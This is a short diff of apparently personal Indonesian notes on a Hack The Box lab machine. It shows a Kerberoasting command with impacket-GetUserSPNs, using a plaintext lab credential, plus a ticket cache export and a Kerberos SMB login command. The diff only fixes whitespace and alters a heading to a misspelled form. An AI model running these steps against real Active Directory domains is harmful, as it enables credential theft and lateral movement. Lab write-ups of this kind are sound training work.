@@ -1,6 +1,6 @@
 sistem autentikasi di windows AD tanpa harus mengirimkan password ke jaringan, tapi menggunakan sistem tiket.
 
-# Kerberoasting Attack 
+# Kerberoasting Attack
 ```shell
 impacket-GetUserSPNs logging.htb/'wallace.everette':'Welcome2026@' -dc-ip 10.129.245.130 -request -outputfile kerberoast_hashes.txt
 ```
@@ -30,7 +30,7 @@ export KRB5CCNAME=MS01\$.ccache
 get TGT and validation with klist 
 ![](Attachments/Pasted%20image%2020260616204625.png)
 
-# Login kerberos
+# Loging kerber
 ```shell
 xc smb 10.129.245.130 -u 'svc_recovery' -p '' -k --use-kcache
 ```
